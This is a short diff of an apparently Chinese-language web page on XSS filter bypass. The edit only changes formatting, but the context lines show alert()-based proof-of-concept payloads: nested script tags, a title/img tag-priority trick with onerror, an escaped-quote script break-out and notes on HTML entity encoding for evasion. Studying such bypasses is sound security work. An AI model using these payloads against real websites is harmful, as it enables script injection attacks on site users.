@@ -630,7 +630,8 @@ onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;
 <pre><code>可利用注释、标签的优先级等
 1.&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;
 2.&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(`xss`);&quot;&gt; //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
-3.&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;</code></pre><p>** 编码绕过**<br>编码需要注意一些问题：<br>html标签中：</p>
+3.&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;</code></pre><p><strong>编码绕过</strong></p>
+<p>编码需要注意一些问题：<br>html标签中：</p>
 <ol>
 <li>html中当然会支持html实体编码，例如&amp;#61，也有&lt;</li>
 <li>支持十六进制，但是要以&amp;#x开头，其中x大写小写无所谓。</li>
